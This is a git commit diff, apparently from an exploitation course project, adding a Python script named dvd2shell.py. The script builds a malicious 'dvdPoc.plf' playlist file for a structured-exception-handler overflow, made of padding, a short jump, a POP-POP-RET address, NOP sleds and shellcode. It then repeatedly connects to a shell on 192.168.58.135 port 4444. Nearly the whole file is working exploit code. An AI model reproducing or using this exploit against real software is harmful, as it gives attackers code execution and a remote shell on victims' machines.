4a6674728f6f4f81a0d2d55d4b99384a40a062b1
Systina <2358784628@qq.com>
2026-01-12 16:33:06 +0800

    p4完成，整理代码

--- Project_4_DVD_SEH/dvd2shell.py
+++ Project_4_DVD_SEH/dvd2shell.py
@@ -1,3 +1,22 @@
 from utils import interactive_shell
+import pwn
+from utils import shellcode_calc,shellcode2
 
-interactive_shell('192.168.58.135',4444)
+seh=pwn.p32(0x6164172e)#POPOPRET
+
+jmp_next_6=b"\xEB\x06\x90\x90"
+print(len(shellcode_calc))
+buffer = b"A"*608 + jmp_next_6 +seh + b"\x90"*8+shellcode2+b"\x90"*8+b"C"*(1002-608-4-4-len(shellcode2)-8*2)
+
+filename = "dvdPoc.plf"
+textfile = open(filename, 'wb')
+textfile.write(buffer)
+textfile.close()
+
+while True:
+    try:
+        interactive_shell('192.168.58.135', 4444)
+    except Exception as e:
+        print(e)
+        pass
+
